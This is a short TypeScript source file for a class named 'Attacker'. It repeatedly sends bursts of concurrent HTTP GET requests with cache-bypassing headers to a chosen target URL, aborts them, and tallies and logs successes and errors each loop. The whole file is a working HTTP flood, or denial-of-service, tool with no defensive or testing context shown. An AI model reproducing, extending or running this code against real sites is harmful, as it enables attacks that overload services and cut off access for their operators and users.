import { Stats } from "./stats";
import request from "request";

export class Attacker {
    private instance: NodeJS.Timeout;
    private requests: request.Request[] = [];
    constructor(private stats: Stats) { }
    run(target: string, concurrency: number, interval: number) {
        this.stop();
        this.stats.target = target;
        this.instance = setInterval(() => {
            this.requests.forEach(req => {
                if(req.response) {
                    this.stats.success += 1;
                } else {
                    this.stats.error += 1;
                }
                req.abort();
            });
            this.requests.splice(0); // delete all

            for(let i = 0; i < concurrency; i += 1) {
                this.attack(target, interval);
            }
            this.stats.loop += 1;
            console.log(`Target: ${this.stats.target} | Loop: ${this.stats.loop} | Success: ${this.stats.success} | Error: ${this.stats.error}`);
        }, interval);
    }

    stop() {
        if(this.instance) clearInterval(this.instance);
        this.stats.reset();
        this.requests.forEach(req => req.abort());
    }

    private attack(target: string, timeout: number) {
        try{
            const req = request.get({
                url: target,
                headers: {
                    'Cache-Control': 'no-cache'
                },
            });
            this.requests.push(req);
        } catch(error) {
            console.error(error);
        }
    }
}